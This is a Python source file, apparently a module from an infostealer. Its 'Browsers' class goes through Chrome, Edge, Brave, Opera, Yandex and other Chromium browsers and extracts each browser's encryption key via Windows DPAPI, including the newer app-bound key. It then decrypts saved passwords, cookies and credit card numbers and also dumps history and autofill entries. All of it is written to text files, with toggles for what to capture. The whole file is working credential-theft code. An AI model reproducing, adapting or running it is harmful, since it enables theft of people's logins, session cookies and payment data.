import base64
import ctypes
import ctypes.wintypes
import json
import logging
import os
import shutil
import sqlite3
import tempfile

from Crypto.Cipher import AES


class DATA_BLOB(ctypes.Structure):
    """Win32 DATA_BLOB structure for CryptUnprotectData."""
    _fields_ = [
        ('cbData', ctypes.wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_ubyte)),
    ]


class Browsers:
    _logger = logging.getLogger('Browsers')

    BROWSER_PATHS = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
        'Chrome SxS': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome SxS', 'User Data'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Opera': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera GX Stable'),
        'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Vivaldi', 'User Data'),
        'Yandex': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Iridium', 'User Data'),
        'Chromium': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Chromium', 'User Data'),
    }

    @staticmethod
    def CryptUnprotectData(encrypted: bytes) -> bytes:
        """Call Win32 CryptUnprotectData via ctypes to decrypt DPAPI blobs.
        
        Builds DATA_BLOB input, calls CryptUnprotectData, copies output, frees buffer.
        """
        blob_in = DATA_BLOB()
        blob_in.cbData = len(encrypted)
        blob_in.pbData = ctypes.cast(
            ctypes.create_string_buffer(encrypted, len(encrypted)),
            ctypes.POINTER(ctypes.c_ubyte)
        )

        blob_out = DATA_BLOB()

        result = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),   # pDataIn
            None,                      # ppszDataDescr
            None,                      # pOptionalEntropy
            None,                      # pvReserved
            None,                      # pPromptStruct
            0,                         # dwFlags
            ctypes.byref(blob_out)    # pDataOut
        )

        if not result:
            raise ctypes.WinError(ctypes.get_last_error())

        # Copy decrypted bytes
        decrypted = bytes(
            (ctypes.c_ubyte * blob_out.cbData).from_address(
                ctypes.addressof(blob_out.pbData.contents)
            )
        )

        # Free the output buffer
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)

        return decrypted

    @staticmethod
    def GetEncryptionKey(browser_path: str) -> bytes | None:
        """Extract the browser's AES-256-GCM decryption key from the Local State file.
        
        Handles three key types:
        1. Standard DPAPI-encrypted key (os_crypt.encrypted_key) — v10/v11 cookies
        2. App-bound encrypted key (os_crypt.app_bound_encrypted_key) — Chrome 133+ v20
        
        Both are base64-encoded, prefixed with 'DPAPI' (5 bytes), and decrypted via CryptUnprotectData.
        The app_bound key may have an additional version prefix that needs stripping.
        """
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.isfile(local_state_path):
            return None

        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
        except Exception as exc:
            Browsers._logger.error(f'Failed to read Local State: {exc}')
            return None

        os_crypt = local_state.get('os_crypt', {})

        # Try app_bound_encrypted_key first (Chrome 133+, for v20 encrypted values)
        app_bound_key_b64 = os_crypt.get('app_bound_encrypted_key')
        if app_bound_key_b64:
            try:
                app_bound_raw = base64.b64decode(app_bound_key_b64)
                # Strip 'DPAPI' prefix (5 bytes)
                if app_bound_raw[:5] == b'DPAPI':
                    app_bound_raw = app_bound_raw[5:]
                # First DPAPI decrypt yields an intermediate blob
                intermediate = Browsers.CryptUnprotectData(app_bound_raw)
                # The intermediate may have a version byte prefix (1 byte = 0x01)
                # followed by the actual key. For Chrome's app-bound flow, the
                # CryptUnprotectData result may need a second pass or may be
                # the final key depending on the Chrome version.
                # In the current (2026) flow: after first DPAPI decrypt, strip
                # a 4-byte header if present, then do a second DPAPI decrypt.
                if len(intermediate) > 64:
                    # Has additional wrapping — strip version header and decrypt again
                    try:
                        key = Browsers.CryptUnprotectData(intermediate[4:])
                        if len(key) == 32:
                            Browsers._logger.debug('Using app_bound key (double DPAPI)')
                            return key
                    except Exception:
                        pass
                if len(intermediate) == 32:
                    Browsers._logger.debug('Using app_bound key (single DPAPI)')
                    return intermediate
                # If intermediate is longer than 32, take last 32 bytes
                if len(intermediate) > 32:
                    Browsers._logger.debug('Using app_bound key (trimmed)')
                    return intermediate[-32:]
            except Exception as exc:
                Browsers._logger.debug(f'App-bound key extraction failed: {exc}')

        # Fall back to standard encrypted_key
        encrypted_key_b64 = os_crypt.get('encrypted_key')
        if not encrypted_key_b64:
            Browsers._logger.error('No encryption key found in Local State')
            return None

        try:
            encrypted_key = base64.b64decode(encrypted_key_b64)
            # Strip 'DPAPI' prefix (5 bytes)
            encrypted_key = encrypted_key[5:]
            key = Browsers.CryptUnprotectData(encrypted_key)
            Browsers._logger.debug('Using standard DPAPI key')
            return key
        except Exception as exc:
            Browsers._logger.error(f'Key decryption failed: {exc}')
            return None

    @staticmethod
    def DecryptValue(encrypted_value: bytes, key: bytes) -> str:
        """Decrypt a Chromium encrypted value.
        
        Supports three formats:
        - v10/v11: Standard AES-256-GCM (nonce=bytes[3:15], ciphertext=bytes[15:-16], tag=bytes[-16:])
        - v20: Chrome 133+ app-bound encryption (same AES-GCM structure, different key derivation)
        - Legacy: Raw DPAPI blob (no version prefix)
        """
        if not encrypted_value:
            return ''

        try:
            # v10 / v11 / v20 — all use AES-256-GCM with same byte layout
            if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
                nonce = encrypted_value[3:15]       # 12-byte nonce
                ciphertext = encrypted_value[15:-16] # encrypted payload
                tag = encrypted_value[-16:]           # 16-byte auth tag

                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8', errors='replace')

            # Legacy DPAPI (pre-v80 Chrome, or other Chromium forks)
            decrypted = Browsers.CryptUnprotectData(encrypted_value)
            return decrypted.decode('utf-8', errors='replace')

        except Exception as exc:
            Browsers._logger.debug(f'Decryption failed: {exc}')
            return ''

    @staticmethod
    def _copy_db_to_temp(db_path: str) -> str | None:
        """Copy a SQLite database to a temp file so we can read it while the browser holds a lock."""
        if not os.path.isfile(db_path):
            return None
        try:
            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.db')
            os.close(tmp_fd)
            shutil.copy2(db_path, tmp_path)
            return tmp_path
        except Exception as exc:
            Browsers._logger.debug(f'Failed to copy db {db_path}: {exc}')
            return None

    @staticmethod
    def GetPasswords(browser_path: str, key: bytes, output_dir: str) -> int:
        """Extract saved passwords from Login Data SQLite database.
        
        Queries: origin_url, username_value, password_value FROM logins
        Saves decrypted credentials to output_dir/passwords.txt
        Returns count of passwords found.
        """
        count = 0
        db_path = os.path.join(browser_path, 'Login Data')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0

        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()

            try:
                cursor.execute(
                    'SELECT origin_url, username_value, password_value FROM logins'
                )
            except sqlite3.OperationalError:
                conn.close()
                return 0

            results = []
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]

                if not url or not username:
                    continue

                password = Browsers.DecryptValue(encrypted_password, key)
                if not password:
                    continue

                results.append(f'URL: {url}\nUsername: {username}\nPassword: {password}\n')
                count += 1

            conn.close()

            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'passwords.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')

        except Exception as exc:
            Browsers._logger.error(f'GetPasswords error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass

        return count

    @staticmethod
    def GetCookies(browser_path: str, key: bytes, output_dir: str) -> int:
        """Extract cookies from the Cookies SQLite database.
        
        Checks both <profile>/Cookies and <profile>/Network/Cookies (Chrome 96+).
        Queries: host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly
        Saves in Netscape cookie format to output_dir/cookies.txt
        Returns count of cookies found.
        """
        count = 0

        # Try both locations
        possible_paths = [
            os.path.join(browser_path, 'Network', 'Cookies'),
            os.path.join(browser_path, 'Cookies'),
        ]

        db_path = None
        for p in possible_paths:
            if os.path.isfile(p):
                db_path = p
                break

        if db_path is None:
            return 0

        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0

        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()

            try:
                cursor.execute(
                    'SELECT host_key, name, path, encrypted_value, '
                    'expires_utc, is_secure, is_httponly FROM cookies'
                )
            except sqlite3.OperationalError:
                conn.close()
                return 0

            results = []
            # Netscape cookie format header
            results.append('# Netscape HTTP Cookie File')
            results.append('# https://curl.se/docs/http-cookies.html')
            results.append('')

            for row in cursor.fetchall():
                host_key = row[0]
                name = row[1]
                path = row[2]
                encrypted_value = row[3]
                expires_utc = row[4]
                is_secure = row[5]
                is_httponly = row[6]

                value = Browsers.DecryptValue(encrypted_value, key)

                # Convert Chrome timestamp (microseconds since 1601-01-01) to Unix epoch
                if expires_utc and expires_utc > 0:
                    # Chrome epoch offset: 11644473600 seconds
                    unix_expires = (expires_utc / 1_000_000) - 11644473600
                    unix_expires = max(0, int(unix_expires))
                else:
                    unix_expires = 0

                include_subdomains = 'TRUE' if host_key.startswith('.') else 'FALSE'
                secure_str = 'TRUE' if is_secure else 'FALSE'
                httponly_prefix = '#HttpOnly_' if is_httponly else ''

                # Netscape format: domain\tinclude_subdomains\tpath\tsecure\texpires\tname\tvalue
                line = (
                    f'{httponly_prefix}{host_key}\t{include_subdomains}\t{path}\t'
                    f'{secure_str}\t{unix_expires}\t{name}\t{value}'
                )
                results.append(line)
                count += 1

            conn.close()

            if count > 0:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'cookies.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')

        except Exception as exc:
            Browsers._logger.error(f'GetCookies error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass

        return count

    @staticmethod
    def GetHistory(browser_path: str, output_dir: str) -> int:
        """Extract browsing history from the History SQLite database.
        
        Queries: url, title, visit_count, last_visit_time FROM urls
        Saves to output_dir/history.txt
        Returns count of history entries.
        """
        count = 0
        db_path = os.path.join(browser_path, 'History')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0

        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()

            try:
                cursor.execute(
                    'SELECT url, title, visit_count, last_visit_time '
                    'FROM urls ORDER BY last_visit_time DESC'
                )
            except sqlite3.OperationalError:
                conn.close()
                return 0

            results = []
            for row in cursor.fetchall():
                url = row[0]
                title = row[1] or '(No Title)'
                visit_count = row[2]
                last_visit_time = row[3]

                # Convert Chrome timestamp to human readable
                if last_visit_time and last_visit_time > 0:
                    import datetime
                    epoch = datetime.datetime(1601, 1, 1)
                    try:
                        visit_dt = epoch + datetime.timedelta(microseconds=last_visit_time)
                        visit_str = visit_dt.strftime('%Y-%m-%d %H:%M:%S')
                    except (OverflowError, ValueError):
                        visit_str = str(last_visit_time)
                else:
                    visit_str = 'Unknown'

                results.append(
                    f'URL: {url}\n'
                    f'Title: {title}\n'
                    f'Visits: {visit_count}\n'
                    f'Last Visit: {visit_str}\n'
                )
                count += 1

            conn.close()

            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'history.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')

        except Exception as exc:
            Browsers._logger.error(f'GetHistory error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass

        return count

    @staticmethod
    def GetAutofills(browser_path: str, output_dir: str) -> int:
        """Extract autofill data from the Web Data SQLite database.
        
        Queries: name, value FROM autofill
        Saves to output_dir/autofill.txt
        Returns count of autofill entries.
        """
        count = 0
        db_path = os.path.join(browser_path, 'Web Data')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0

        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()

            try:
                cursor.execute('SELECT name, value FROM autofill')
            except sqlite3.OperationalError:
                conn.close()
                return 0

            results = []
            for row in cursor.fetchall():
                name = row[0]
                value = row[1]
                if name and value:
                    results.append(f'{name}: {value}')
                    count += 1

            conn.close()

            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'autofill.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')

        except Exception as exc:
            Browsers._logger.error(f'GetAutofills error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass

        return count

    @staticmethod
    def GetCreditCards(browser_path: str, key: bytes, output_dir: str) -> int:
        """Extract saved credit cards from the Web Data SQLite database.
        
        Queries: name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards
        Decrypts card_number_encrypted with the browser's AES key.
        Saves to output_dir/credit_cards.txt
        Returns count of cards found.
        """
        count = 0
        db_path = os.path.join(browser_path, 'Web Data')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0

        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()

            try:
                cursor.execute(
                    'SELECT name_on_card, expiration_month, expiration_year, '
                    'card_number_encrypted FROM credit_cards'
                )
            except sqlite3.OperationalError:
                conn.close()
                return 0

            results = []
            for row in cursor.fetchall():
                name_on_card = row[0] or 'Unknown'
                exp_month = row[1]
                exp_year = row[2]
                card_encrypted = row[3]

                card_number = Browsers.DecryptValue(card_encrypted, key)
                if not card_number:
                    continue

                results.append(
                    f'Name: {name_on_card}\n'
                    f'Number: {card_number}\n'
                    f'Expires: {exp_month:02d}/{exp_year}\n'
                )
                count += 1

            conn.close()

            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'credit_cards.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')

        except Exception as exc:
            Browsers._logger.error(f'GetCreditCards error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass

        return count

    @staticmethod
    def GetProfiles(browser_path: str) -> list[str]:
        """Return list of profile directories (Default, Profile 1, Profile 2, etc.)."""
        profiles = []
        if not os.path.isdir(browser_path):
            return profiles

        for item in os.listdir(browser_path):
            if item == 'Default' or item.startswith('Profile '):
                full_path = os.path.join(browser_path, item)
                if os.path.isdir(full_path):
                    profiles.append(full_path)

        # Also check for Opera-style profile (data is in browser_path root)
        if not profiles and os.path.isfile(os.path.join(browser_path, 'Login Data')):
            profiles.append(browser_path)

        return profiles

    @staticmethod
    def run(output_dir: str) -> None:
        """Main entry point for browser data collection.
        
        Iterates all known Chromium browsers, extracts encryption keys,
        and collects passwords, cookies, history, autofill, and credit cards
        per-profile based on Settings flags.
        """
        browsers_dir = os.path.join(output_dir, 'Browsers')

        for browser_name, browser_path in Browsers.BROWSER_PATHS.items():
            if not os.path.isdir(browser_path):
                continue

            Browsers._logger.debug(f'Processing {browser_name} at {browser_path}')

            key = Browsers.GetEncryptionKey(browser_path)
            if key is None:
                Browsers._logger.debug(f'No key for {browser_name}, skipping encrypted data')

            profiles = Browsers.GetProfiles(browser_path)
            if not profiles:
                Browsers._logger.debug(f'No profiles found for {browser_name}')
                continue

            for profile_path in profiles:
                profile_name = os.path.basename(profile_path)
                profile_output = os.path.join(browsers_dir, browser_name, profile_name)

                total = 0

                if Settings.CapturePasswords and key:
                    n = Browsers.GetPasswords(profile_path, key, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} passwords')
                    total += n

                if Settings.CaptureCookies and key:
                    n = Browsers.GetCookies(profile_path, key, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} cookies')
                    total += n

                if Settings.CaptureHistory:
                    n = Browsers.GetHistory(profile_path, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} history entries')
                    total += n

                if Settings.CaptureAutofills:
                    n = Browsers.GetAutofills(profile_path, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} autofills')
                    total += n

                if Settings.CaptureCreditCards and key:
                    n = Browsers.GetCreditCards(profile_path, key, profile_output)
                    Browsers._logger.debug(f'{browser_name}/{profile_name}: {n} credit cards')
                    total += n

                if total > 0:
                    Browsers._logger.debug(
                        f'{browser_name}/{profile_name}: {total} total items collected'
                    )
